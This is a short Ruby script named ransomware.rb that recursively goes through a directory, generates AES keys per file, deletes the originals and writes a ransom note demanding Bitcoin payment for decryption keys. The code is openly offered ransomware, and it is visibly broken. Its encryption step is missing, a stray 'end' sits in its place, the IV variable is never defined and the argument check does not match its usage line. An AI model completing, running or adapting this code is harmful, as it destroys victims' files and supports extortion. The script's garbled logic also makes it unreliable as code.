require 'openssl'
require 'fileutils'

def encrypt_file(file_path)
  cipher = OpenSSL::Cipher.new('AES-256-CBC')
  cipher.encrypt
  key = cipher.random_key

  end

  File.open(file_path + '.key', 'w') do |io|
    io.write key
  end

  File.open(file_path + '.iv', 'w') do |io|
    io.write iv
  end

  File.delete(file_path)
end

def main
  if ARGV.length < 2
    puts "Usage: ruby ransomware.rb <directory>"
    exit 1
  end

  directory = ARGV[0]

  Dir.glob(File.join(directory, '**', '*')).each do |file|
    if File.file?(file)
      encrypt_file(file)
    end
  end

  ransom_note = <<~EOM
    Your files have been encrypted.
    To restore access, send your Bitcoin address to [insert email address]
    Once the payment has been confirmed, you will receive the decryption key(s).
  EOM

  File.open('ransom_note.txt', 'w') do |f|
    f.puts ransom_note
  end
end

main
